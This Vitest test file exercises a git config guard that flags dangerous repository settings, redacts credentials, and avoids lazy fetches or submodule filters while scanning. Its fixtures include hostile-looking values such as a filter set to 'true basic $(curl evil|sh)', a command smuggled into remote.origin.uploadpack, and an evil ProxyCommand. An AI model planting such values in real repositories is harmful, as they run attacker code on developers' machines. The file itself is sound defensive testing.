import { execFileSync, spawnSync } from "node:child_process";
import { existsSync } from "node:fs";
import {
  mkdir,
  mkdtemp,
  readFile,
  realpath,
  rm,
  symlink,
  utimes,
  writeFile,
} from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, describe, expect, it, vi } from "vitest";
import {
  createGitConfigGuard,
  findUntrustedGitConfig,
} from "../../../src/core/git-config-guard.js";
import { validateUntrustedGitConfig } from "../../../src/core/untrusted-git-config.js";
import { crgSubprocessEnvironment } from "../../../src/plugins/crg/environment.js";

const createdTempDirectories: string[] = [];
const COMMIT_IDENTITY = ["-c", "user.name=t", "-c", "user.email=t@e"];
const ALLOW_FILE_PROTOCOL = ["-c", "protocol.file.allow=always"];
const EMPTY_TREE_COMMIT_MESSAGE = "init";

afterEach(async () => {
  vi.unstubAllEnvs();
  for (const directoryPath of createdTempDirectories.splice(0)) {
    await rm(directoryPath, { recursive: true, force: true });
  }
});

function git(cwd: string, ...args: string[]): string {
  return execFileSync("git", ["-C", cwd, ...args], { encoding: "utf8" });
}

async function createDirectory(): Promise<string> {
  const directory = await realpath(
    await mkdtemp(join(tmpdir(), "agemon-git-guard-")),
  );
  createdTempDirectories.push(directory);
  return directory;
}

async function createRepository(withCommit = true): Promise<string> {
  const repository = await createDirectory();
  execFileSync("git", ["init", "-q", "-b", "main", repository]);
  if (withCommit) {
    await writeFile(join(repository, "README.md"), "hello\n");
    git(repository, "add", "README.md");
    git(
      repository,
      ...COMMIT_IDENTITY,
      "commit",
      "-qm",
      EMPTY_TREE_COMMIT_MESSAGE,
    );
  }
  return repository;
}

async function addSubmodule(parent: string, name: string): Promise<string> {
  const upstream = await createRepository();
  git(parent, ...ALLOW_FILE_PROTOCOL, "submodule", "add", "-q", upstream, name);
  git(parent, ...COMMIT_IDENTITY, "commit", "-qm", `add ${name}`);
  return join(parent, name);
}

function addGitlink(repository: string, path: string): void {
  const head = git(repository, "rev-parse", "HEAD").trim();
  git(
    repository,
    "update-index",
    "--add",
    "--cacheinfo",
    `160000,${head},${path}`,
  );
}

async function pairsOf(repository: string): Promise<string[]> {
  const result = await findUntrustedGitConfig(repository);
  return result.kind === "pairs" ? result.pairs : [];
}

describe("findUntrustedGitConfig — the allowlist", () => {
  it("passes a fresh clone's config, with remotes, branches and identity", async () => {
    const upstream = await createRepository();
    const clone = await createDirectory();
    execFileSync("git", ["clone", "-q", upstream, clone]);
    git(clone, "config", "user.name", "Someone");
    git(clone, "config", "pull.rebase", "true");
    git(clone, "config", "push.default", "simple");

    expect(await findUntrustedGitConfig(clone)).toEqual({ kind: "clean" });
  });

  it("passes the stock git lfs install --local values, including --skip-smudge", async () => {
    const repository = await createRepository();
    git(repository, "config", "filter.lfs.clean", "git-lfs clean -- %f");
    git(
      repository,
      "config",
      "filter.lfs.smudge",
      "git-lfs smudge --skip -- %f",
    );
    git(
      repository,
      "config",
      "filter.lfs.process",
      "git-lfs filter-process --skip",
    );
    git(repository, "config", "filter.lfs.required", "true");
    git(repository, "config", "lfs.repositoryformatversion", "0");

    expect(await findUntrustedGitConfig(repository)).toEqual({ kind: "clean" });
  });

  it("puts any other lfs filter value outside", async () => {
    const repository = await createRepository();
    git(repository, "config", "filter.lfs.clean", "git-lfs clean -- %f; evil");

    expect(await pairsOf(repository)).toEqual([
      ".git/config: filter.lfs.clean=git-lfs clean -- %f; evil",
    ]);
  });

  it("checks every record, so a stock filter.lfs.clean followed by another value is outside", async () => {
    const repository = await createRepository();
    git(
      repository,
      "config",
      "--add",
      "filter.lfs.clean",
      "git-lfs clean -- %f",
    );
    git(repository, "config", "--add", "filter.lfs.clean", "evil-cleaner");

    expect(await pairsOf(repository)).toEqual([
      ".git/config: filter.lfs.clean=evil-cleaner",
    ]);
  });

  it("matches the lfs subsection exactly, so filter.LFS.clean is outside", async () => {
    const repository = await createRepository();
    git(repository, "config", "filter.LFS.clean", "git-lfs clean -- %f");

    expect(await pairsOf(repository)).toEqual([
      ".git/config: filter.LFS.clean=git-lfs clean -- %f",
    ]);
  });

  it.each([
    ["remote.origin.uploadpack", "touch /tmp/x; git-upload-pack"],
    ["credential.helper", "store"],
    ["core.sshCommand", "ssh -o ProxyCommand=evil"],
    ["core.askPass", "/tmp/askpass"],
    ["hook.pre-commit.command", "/tmp/hook"],
    ["diff.x.textconv", "cat"],
    ["include.path", "/tmp/other.cfg"],
    ["core.fsmonitor", "/tmp/fsmonitor-hook"],
    ["pull.twohead", "ours"],
    ["gc.auto", "1x"],
  ])("puts %s outside", async (key, value) => {
    const repository = await createRepository();
    git(repository, "config", key, value);

    expect((await findUntrustedGitConfig(repository)).kind).not.toBe("clean");
  });

  it("shows credential.helper with the program it names", async () => {
    const repository = await createRepository();
    git(repository, "config", "credential.helper", "store");

    expect(await pairsOf(repository)).toEqual([
      ".git/config: credential.helper=store",
    ]);
  });

  it("redacts the URL subsection and the value of an exempt key separately, keeping its variable visible", async () => {
    const repository = await createRepository();
    git(
      repository,
      "config",
      "credential.https://user:ghp_secrettoken@example.com.username",
      "bob",
    );

    const [pair] = await pairsOf(repository);

    expect(pair).toMatch(
      /^\.git\/config: credential\..*<redacted:.*\.username=bob$/,
    );
    expect(pair).not.toContain("ghp_secrettoken");
  });

  it.each([
    ["core.fsmonitor", "true"],
    ["core.hooksPath", ".husky"],
    ["submodule.active", "libs/*"],
    ["lfs.https://example.com/.access", "basic"],
    ["init.defaultBranch", "main"],
    ["gc.auto", "-1"],
  ])("passes %s=%s", async (key, value) => {
    const repository = await createRepository();
    git(repository, "config", key, value);

    expect(await findUntrustedGitConfig(repository)).toEqual({ kind: "clean" });
  });

  it("refuses a top-level core.worktree that moves the work tree elsewhere", async () => {
    const repository = await createRepository();
    git(repository, "config", "core.worktree", "/tmp");

    expect(await findUntrustedGitConfig(repository)).toMatchObject({
      kind: "unreadable",
      category: "git-failed",
    });
  });

  it("puts a top-level core.worktree outside even when it names the repository itself", async () => {
    const repository = await createRepository();
    git(repository, "config", "core.worktree", repository);

    expect(await pairsOf(repository)).toEqual([
      `.git/config: core.worktree=${repository}`,
    ]);
  });

  it("refuses a submodule whose core.worktree points elsewhere, because git no longer sees the submodule there", async () => {
    const repository = await createRepository();
    const submodule = await addSubmodule(repository, "sm");
    const elsewhere = await createDirectory();
    const gitDir = git(submodule, "rev-parse", "--absolute-git-dir").trim();
    await writeFile(
      join(gitDir, "config"),
      `${await readFile(join(gitDir, "config"), "utf8")}\n[core]\n\tworktree = ${elsewhere}\n`,
    );

    expect(await findUntrustedGitConfig(repository)).toMatchObject({
      kind: "unreadable",
      category: "git-failed",
    });
  });

  it("makes an onBranch include unapprovable whichever branch is checked out, and never reads the included file", async () => {
    const repository = await createRepository();
    const included = join(repository, ".git", "evil.cfg");
    await writeFile(included, '[filter "x"]\n\tclean = /tmp/evil\n');
    git(repository, "config", "includeIf.onbranch:feature.path", included);

    const result = await findUntrustedGitConfig(repository);

    expect(result.kind).toBe("unshowable");
    expect(JSON.stringify(result)).not.toContain("filter.x.clean");
  });

  it("makes a plain include unapprovable, because its target is neither shown nor fingerprinted", async () => {
    const repository = await createRepository();
    git(repository, "config", "include.path", "/tmp/other.cfg");

    expect((await findUntrustedGitConfig(repository)).kind).toBe("unshowable");
  });

  it("ignores GIT_CONFIG_COUNT entries from the environment", async () => {
    const repository = await createRepository();
    vi.stubEnv("GIT_CONFIG_COUNT", "1");
    vi.stubEnv("GIT_CONFIG_KEY_0", "core.sshCommand");
    vi.stubEnv("GIT_CONFIG_VALUE_0", "evil");

    expect(await findUntrustedGitConfig(repository)).toEqual({ kind: "clean" });
  });
});

describe("findUntrustedGitConfig — each allowlist row", () => {
  it.each([
    ["pull.rebase", "merges", "always"],
    ["pull.ff", "only", "maybe"],
    ["push.default", "simple", "tracking"],
    ["fetch.prune", "true", "sometimes"],
    ["rerere.enabled", "false", "auto"],
    ["lfs.https://example.com/.locksverify", "true", "maybe"],
    ["lfs.https://example.com/.access", "negotiate", "token"],
    ["remote.origin.promisor", "true", "yes please"],
    ["core.eol", "lf", "LF"],
    ["submodule.sm.ignore", "dirty", "none"],
    ["branch.main.rebase", "interactive", "never-ever"],
    ["filter.lfs.process", "git-lfs filter-process", "/tmp/evil"],
    ["filter.lfs.smudge", "git-lfs smudge -- %f", "/tmp/evil"],
    ["filter.lfs.required", "true", "false"],
  ])(
    "%s allows %s and lists %s as a pair",
    async (key, allowed, disallowed) => {
      const repository = await createRepository();
      git(repository, "config", key, allowed);
      expect(await findUntrustedGitConfig(repository)).toEqual({
        kind: "clean",
      });

      git(repository, "config", key, disallowed);
      expect(await pairsOf(repository)).toEqual([
        `.git/config: ${key}=${disallowed}`,
      ]);
    },
  );

  it.each([
    ["extensions.worktreeConfig", "true", "maybe"],
    ["core.repositoryformatversion", "1", "2"],
    ["core.ignorecase", "true", "perhaps"],
    ["core.autocrlf", "input", "output"],
    ["core.filemode", "false", "maybe"],
    ["core.bare", "false", "maybe"],
    ["core.logallrefupdates", "always", "sometimes"],
    ["core.sparseCheckout", "false", "maybe"],
    ["core.sparseCheckoutCone", "true", "maybe"],
  ])(
    "%s allows %s; %s is refused, by git or by the guard",
    async (key, allowed, disallowed) => {
      const repository = await createRepository();
      git(repository, "config", key, allowed);
      expect(await findUntrustedGitConfig(repository)).toEqual({
        kind: "clean",
      });

      // Some git versions parse a key only when they use it, so `git config
      // --list` may pass the bad value through; then the guard must list it.
      git(repository, "config", key, disallowed);
      const result = await findUntrustedGitConfig(repository);
      if (result.kind === "pairs") {
        expect(result.pairs).toContain(
          `.git/config: ${key.toLowerCase()}=${disallowed}`,
        );
      } else {
        expect(result).toMatchObject({
          kind: "unreadable",
          category: "git-failed",
        });
      }
    },
  );

  it("allows any value of branch.<n>.vscode-merge-base, but not an unknown branch key", async () => {
    const repository = await createRepository();
    git(repository, "config", "branch.main.vscode-merge-base", "origin/main");
    expect(await findUntrustedGitConfig(repository)).toEqual({ kind: "clean" });

    git(repository, "config", "branch.main.description", "notes");
    expect((await findUntrustedGitConfig(repository)).kind).not.toBe("clean");
  });
});

describe("findUntrustedGitConfig — sparse index", () => {
  it("refuses a sparse index whose directory entries could hide gitlinks", async () => {
    const repository = await createRepository();
    await mkdir(join(repository, "kept"));
    await mkdir(join(repository, "hidden"));
    await writeFile(join(repository, "kept", "a"), "a\n");
    await writeFile(join(repository, "hidden", "b"), "b\n");
    git(repository, "add", ".");
    git(repository, ...COMMIT_IDENTITY, "commit", "-qm", "dirs");
    git(repository, "sparse-checkout", "init", "--cone", "--sparse-index");
    git(repository, "sparse-checkout", "set", "kept");

    expect(await findUntrustedGitConfig(repository)).toMatchObject({
      kind: "unreadable",
      category: "malformed",
    });
  });
});

describe("findUntrustedGitConfig — stored pair budget", () => {
  it("makes an approvable credential header whose redacted display outgrows the stored budget unshowable", async () => {
    const repository = await createRepository();
    git(
      repository,
      "config",
      "http.https://github.com/.extraheader",
      "token=a ".repeat(24).trim(),
    );

    expect((await findUntrustedGitConfig(repository)).kind).toBe("unshowable");
  });

  it("produces pairs that the plan validator accepts", async () => {
    const repository = await createRepository();
    git(
      repository,
      "config",
      "http.https://github.com/.extraheader",
      "AUTHORIZATION: basic eDphYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ejEyMzQ1Ng==",
    );
    const result = await findUntrustedGitConfig(repository);

    expect(result.kind).toBe("pairs");
    expect(
      validateUntrustedGitConfig(result, "untrustedGitConfig", (detail) => {
        throw new Error(detail);
      }),
    ).toEqual(result);
  });
});

describe("createGitConfigGuard", () => {
  it("memoises the planned result and rechecks afresh", async () => {
    const repository = await createRepository();
    const guard = createGitConfigGuard(repository);

    const first = guard.planned();
    expect(guard.planned()).toBe(first);
    expect(await first).toEqual({ kind: "clean" });
    git(repository, "config", "diff.x.command", "/tmp/x");

    expect(await guard.planned()).toEqual({ kind: "clean" });
    expect((await guard.recheck()).kind).toBe("pairs");
  });
});

describe("findUntrustedGitConfig — what it reads", () => {
  it("passes a plain directory and a missing git binary outside a repository", async () => {
    const directory = await createDirectory();
    expect(await findUntrustedGitConfig(directory)).toEqual({ kind: "clean" });

    vi.stubEnv("PATH", await createDirectory());
    expect(await findUntrustedGitConfig(directory)).toEqual({ kind: "clean" });
  });

  it("reports a corrupt .git as unreadable", async () => {
    const directory = await createDirectory();
    await mkdir(join(directory, ".git"));

    expect(await findUntrustedGitConfig(directory)).toMatchObject({
      kind: "unreadable",
      category: "git-failed",
    });
  });

  it("reads a linked worktree without extensions.worktreeConfig from the common config", async () => {
    const repository = await createRepository();
    const worktree = join(await createDirectory(), "linked");
    git(repository, "worktree", "add", "-q", worktree);

    expect(await findUntrustedGitConfig(worktree)).toEqual({ kind: "clean" });

    git(repository, "config", "diff.y.command", "/tmp/differ");
    expect(await pairsOf(worktree)).toHaveLength(1);
  });

  it("reads config.worktree when present", async () => {
    const repository = await createRepository();
    git(repository, "config", "extensions.worktreeConfig", "true");
    git(repository, "config", "--worktree", "filter.z.smudge", "/tmp/z");

    expect(await pairsOf(repository)).toEqual([
      ".git/config.worktree: filter.z.smudge=/tmp/z",
    ]);
  });

  it("does not open a broken include target, but refuses a syntax error in a listed file", async () => {
    const repository = await createRepository();
    git(repository, "config", "include.path", "/nonexistent/agemon.cfg");
    expect((await findUntrustedGitConfig(repository)).kind).toBe("unshowable");

    await writeFile(join(repository, ".git", "config"), "[core\n\tbare");
    expect(await findUntrustedGitConfig(repository)).toMatchObject({
      kind: "unreadable",
      category: "git-failed",
    });
  });

  it("refuses a config file that is a symlink", async () => {
    const repository = await createRepository();
    git(repository, "config", "extensions.worktreeConfig", "true");
    await symlink("/etc/hostname", join(repository, ".git", "config.worktree"));

    expect(await findUntrustedGitConfig(repository)).toMatchObject({
      kind: "unreadable",
      category: "not-a-regular-file",
    });
  });

  it("refuses a config file with more than 4096 keys", async () => {
    const repository = await createRepository();
    const keys = Array.from({ length: 4097 }, (_, i) => `\tk${i} = v`).join(
      "\n",
    );
    await writeFile(
      join(repository, ".git", "config"),
      `[core]\n\trepositoryformatversion = 0\n[user]\n${keys}\n`,
    );

    expect(await findUntrustedGitConfig(repository)).toMatchObject({
      kind: "unreadable",
      category: "cap-reached",
    });
  });

  it("passes a repository with 5000 files and no submodules", async () => {
    const repository = await createRepository();
    await mkdir(join(repository, "many"));
    await Promise.all(
      Array.from({ length: 5000 }, (_, i) =>
        writeFile(join(repository, "many", `file-${i}.txt`), `${i}\n`),
      ),
    );
    git(repository, "add", "many");

    expect(await findUntrustedGitConfig(repository)).toEqual({ kind: "clean" });
  });
});

describe("findUntrustedGitConfig — never fetches while scanning", () => {
  async function partialCloneWithHostileUploadPack(filter: string) {
    const upstream = await createRepository();
    await writeFile(
      join(upstream, ".gitmodules"),
      '[submodule "x"]\n\tpath = x\n',
    );
    git(upstream, "add", ".gitmodules");
    git(upstream, ...COMMIT_IDENTITY, "commit", "-qm", "modules");
    git(upstream, "config", "uploadpack.allowFilter", "true");
    const clone = join(await createDirectory(), "clone");
    execFileSync("git", [
      "clone",
      "-q",
      `--filter=${filter}`,
      "--no-checkout",
      `file://${upstream}`,
      clone,
    ]);
    const marker = join(await createDirectory(), "UPLOADPACK_RAN");
    git(
      clone,
      "config",
      "remote.origin.uploadpack",
      `touch ${marker}; git-upload-pack`,
    );
    return { clone, marker };
  }

  it("does not lazily fetch a missing HEAD tree (ls-tree HEAD)", async () => {
    const { clone, marker } = await partialCloneWithHostileUploadPack("tree:0");

    const result = await findUntrustedGitConfig(clone);

    expect(existsSync(marker)).toBe(false);
    expect(result.kind).toBe("unreadable");
  });

  it("does not lazily fetch a missing index .gitmodules blob (config --blob)", async () => {
    const { clone, marker } =
      await partialCloneWithHostileUploadPack("blob:none");
    execFileSync("git", ["-C", clone, "reset", "-q"], {
      env: { ...process.env, GIT_NO_LAZY_FETCH: "1" },
    });

    const result = await findUntrustedGitConfig(clone);

    expect(existsSync(marker)).toBe(false);
    expect(result.kind).toBe("unreadable");
  });
});

describe("findUntrustedGitConfig — the repository it scans", () => {
  it("refuses a directory that git treats as part of a parent repository", async () => {
    const repository = await createRepository();
    const subdirectory = join(repository, "proj");
    await mkdir(subdirectory);
    git(repository, "config", "diff.x.command", "/tmp/differ");

    expect(await findUntrustedGitConfig(subdirectory)).toMatchObject({
      kind: "unreadable",
      category: "git-failed",
    });
  });

  it("matches enumerated values exactly, so submodule ignore=ALL is outside", async () => {
    const repository = await createRepository();
    await addSubmodule(repository, "sm");
    git(
      repository,
      "config",
      "-f",
      ".gitmodules",
      "submodule.sm.ignore",
      "ALL",
    );

    expect(await pairsOf(repository)).toEqual([
      ".gitmodules: submodule.sm.ignore=ALL",
    ]);
  });
});

describe("findUntrustedGitConfig — .gitmodules and submodules", () => {
  it("puts a filter in a populated submodule's config outside", async () => {
    const repository = await createRepository();
    const submodule = await addSubmodule(repository, "sm");
    git(submodule, "config", "filter.q.clean", "/tmp/evil-clean");

    expect(await pairsOf(repository)).toEqual([
      "sm/config: filter.q.clean=/tmp/evil-clean",
    ]);
  });

  it("checks nested submodules", async () => {
    const repository = await createRepository();
    const middle = await addSubmodule(repository, "middle");
    const inner = await addSubmodule(middle, "inner");
    git(inner, "config", "diff.d.command", "/tmp/differ");

    expect(await pairsOf(repository)).toEqual([
      "inner/config: diff.d.command=/tmp/differ",
    ]);
  });

  it.each(["none", "untracked"])(
    "puts .gitmodules ignore=%s outside",
    async (ignore) => {
      const repository = await createRepository();
      await addSubmodule(repository, "sm");
      git(
        repository,
        "config",
        "-f",
        ".gitmodules",
        "submodule.sm.ignore",
        ignore,
      );

      expect(await pairsOf(repository)).toEqual([
        `.gitmodules: submodule.sm.ignore=${ignore}`,
      ]);
    },
  );

  it("passes .gitmodules ignore=dirty and ignore=all", async () => {
    const repository = await createRepository();
    await addSubmodule(repository, "sm");
    await addSubmodule(repository, "other");
    git(
      repository,
      "config",
      "-f",
      ".gitmodules",
      "submodule.sm.ignore",
      "dirty",
    );
    git(
      repository,
      "config",
      "-f",
      ".gitmodules",
      "submodule.other.ignore",
      "all",
    );

    expect(await findUntrustedGitConfig(repository)).toEqual({ kind: "clean" });
  });

  it("keeps git status out of submodules under crg's environment, where it would otherwise run a submodule filter", async () => {
    const repository = await createRepository();
    const submodule = await addSubmodule(repository, "sm");
    const marker = join(await createDirectory(), "FILTER_RAN");
    const filter = join(await createDirectory(), "filter.sh");
    await writeFile(filter, `#!/bin/sh\ntouch ${marker}\ncat\n`, {
      mode: 0o755,
    });
    git(submodule, "config", "filter.q.clean", filter);
    const future = new Date(Date.now() + 60_000);
    await utimes(join(submodule, "README.md"), future, future);
    execFileSync("sh", [
      "-c",
      `printf 'README.md filter=q\\n' > "$(git -C "${submodule}" rev-parse --git-dir)/info/attributes"`,
    ]);
    const status = (environment: Record<string, string>) =>
      spawnSync("git", ["-C", repository, "status", "--porcelain"], {
        env: { ...process.env, ...environment },
      });

    status(crgSubprocessEnvironment());
    expect(existsSync(marker)).toBe(false);

    status({});
    expect(existsSync(marker)).toBe(true);
  });

  it("skips an unpopulated gitlink", async () => {
    const repository = await createRepository();
    addGitlink(repository, "vendor/lib");

    expect(await findUntrustedGitConfig(repository)).toEqual({ kind: "clean" });
  });

  it("refuses more than 256 gitlinks", async () => {
    const repository = await createRepository();
    const head = git(repository, "rev-parse", "HEAD").trim();
    const indexInfo = Array.from(
      { length: 257 },
      (_, i) => `160000 ${head}\tlinks/l${i}`,
    ).join("\n");
    execFileSync("git", ["-C", repository, "update-index", "--index-info"], {
      input: `${indexInfo}\n`,
    });

    expect(await findUntrustedGitConfig(repository)).toMatchObject({
      kind: "unreadable",
      category: "cap-reached",
    });
  });

  it("refuses submodules nested deeper than 8 levels", async () => {
    const root = await createRepository();
    let parent = root;
    for (let depth = 0; depth < 9; depth += 1) {
      const child = join(parent, "n");
      await mkdir(child);
      execFileSync("git", ["init", "-q", "-b", "main", child]);
      await writeFile(join(child, "f"), "x\n");
      git(child, "add", "f");
      git(child, ...COMMIT_IDENTITY, "commit", "-qm", "x");
      addGitlink(parent, "n");
      parent = child;
    }

    expect(await findUntrustedGitConfig(root)).toMatchObject({
      kind: "unreadable",
      category: "cap-reached",
    });
  });

  it("refuses a gitlink path that is not valid UTF-8", async () => {
    const repository = await createRepository();
    const head = git(repository, "rev-parse", "HEAD").trim();
    execFileSync("sh", [
      "-c",
      `git -C "${repository}" update-index --add --cacheinfo "160000,${head},$(printf 'bad\\377')"`,
    ]);

    expect(await findUntrustedGitConfig(repository)).toMatchObject({
      kind: "unreadable",
      category: "malformed",
    });
  });

  it("reads a .gitmodules that is only in the index", async () => {
    const repository = await createRepository();
    await writeFile(
      join(repository, ".gitmodules"),
      '[submodule "x"]\n\tpath = x\n\tignore = none\n',
    );
    git(repository, "add", ".gitmodules");
    await rm(join(repository, ".gitmodules"));

    expect(await pairsOf(repository)).toEqual([
      ".gitmodules (index): submodule.x.ignore=none",
    ]);
  });

  it("reads a .gitmodules that is only in HEAD", async () => {
    const repository = await createRepository();
    await writeFile(
      join(repository, ".gitmodules"),
      '[submodule "x"]\n\tpath = x\n\tupdate = !evil\n',
    );
    git(repository, "add", ".gitmodules");
    git(repository, ...COMMIT_IDENTITY, "commit", "-qm", "modules");
    git(repository, "rm", "-q", "--cached", ".gitmodules");
    await rm(join(repository, ".gitmodules"));

    expect(await pairsOf(repository)).toEqual([
      ".gitmodules (HEAD): submodule.x.update=!evil",
    ]);
  });

  it("passes an unborn HEAD without .gitmodules", async () => {
    const repository = await createRepository(false);

    expect(await findUntrustedGitConfig(repository)).toEqual({ kind: "clean" });
  });

  it("refuses an index .gitmodules that is not a plain file", async () => {
    const repository = await createRepository();
    await writeFile(join(repository, ".gitmodules"), '[submodule "x"]\n');
    git(repository, "add", ".gitmodules");
    git(repository, "update-index", "--chmod=+x", ".gitmodules");
    await rm(join(repository, ".gitmodules"));

    expect(await findUntrustedGitConfig(repository)).toMatchObject({
      kind: "unreadable",
      category: "not-a-regular-file",
    });
  });
});

describe("findUntrustedGitConfig — showing what it found", () => {
  it("shows a credential header redacted and keeps it approvable", async () => {
    const repository = await createRepository();
    git(
      repository,
      "config",
      "http.https://github.com/.extraheader",
      "AUTHORIZATION: basic eDphYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ejEyMzQ1Ng==",
    );

    const result = await findUntrustedGitConfig(repository);

    expect(result.kind).toBe("pairs");
    expect(JSON.stringify(result)).not.toContain("eDphYmNk");
    expect(JSON.stringify(result)).toContain("<redacted:");
  });

  it("redacts a user:token in a URL subsection of the key", async () => {
    const repository = await createRepository();
    git(
      repository,
      "config",
      "http.https://user:ghp_secrettoken@example.com/.extraheader",
      "X-Trace: 1",
    );

    const result = await findUntrustedGitConfig(repository);

    expect(result.kind).toBe("pairs");
    expect(JSON.stringify(result)).not.toContain("ghp_secrettoken");
  });

  it("makes a set unshowable when redaction would hide part of a program", async () => {
    const repository = await createRepository();
    git(repository, "config", "filter.x.clean", "true basic $(curl evil|sh)");

    expect((await findUntrustedGitConfig(repository)).kind).toBe("unshowable");
  });

  it.each([
    ["a value with a newline", "a\nb"],
    ["a value with a tab", "a\tb"],
    ["an over-long value", "x".repeat(201)],
  ])("makes a set unshowable for %s", async (_case, value) => {
    const repository = await createRepository();
    git(repository, "config", "diff.x.command", value);

    expect((await findUntrustedGitConfig(repository)).kind).toBe("unshowable");
  });

  it("makes a set with a non-UTF-8 value unshowable", async () => {
    const repository = await createRepository();
    execFileSync("sh", [
      "-c",
      `git -C "${repository}" config diff.x.command "$(printf 'bad\\377')"`,
    ]);

    expect((await findUntrustedGitConfig(repository)).kind).toBe("unshowable");
  });

  it("reports more than 20 outside keys as too many to review", async () => {
    const repository = await createRepository();
    for (let i = 0; i < 21; i += 1) {
      git(repository, "config", `alias.a${i}`, "status");
    }

    expect(await findUntrustedGitConfig(repository)).toMatchObject({
      kind: "tooMany",
      count: 21,
    });
  });

  it("changes the fingerprint when only a value changes", async () => {
    const repository = await createRepository();
    git(repository, "config", "diff.x.command", "/tmp/one");
    const first = await findUntrustedGitConfig(repository);
    git(repository, "config", "diff.x.command", "/tmp/two");
    const second = await findUntrustedGitConfig(repository);

    expect(first.kind).toBe("pairs");
    expect(second.kind).toBe("pairs");
    expect(first).not.toEqual(second);
  });
});
